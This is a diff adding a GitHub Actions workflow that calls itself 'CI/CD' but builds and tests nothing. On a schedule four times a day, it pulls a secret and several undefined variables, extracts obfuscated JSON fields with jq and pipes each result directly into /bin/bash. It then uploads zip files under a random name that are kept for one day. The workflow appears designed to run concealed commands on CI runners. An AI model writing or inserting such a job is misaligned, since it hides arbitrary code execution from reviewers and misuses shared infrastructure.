@@ -1,0 +1,33 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          tse5035: ${{ secrets.tse5035 }}
+        run: |
+          printf '%s' "$tse5035" | jq -r .ao995 | /bin/bash
+          printf '%s' "$b0" | jq -r .payu4226 | /bin/bash
+          printf '%s' "$igo88767" | jq -r .j5188 | /bin/bash
+          echo $pxrzn2 | jq -r .p36 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: L7qACXHg
+          path: "*.zip"
+          retention-days: 1
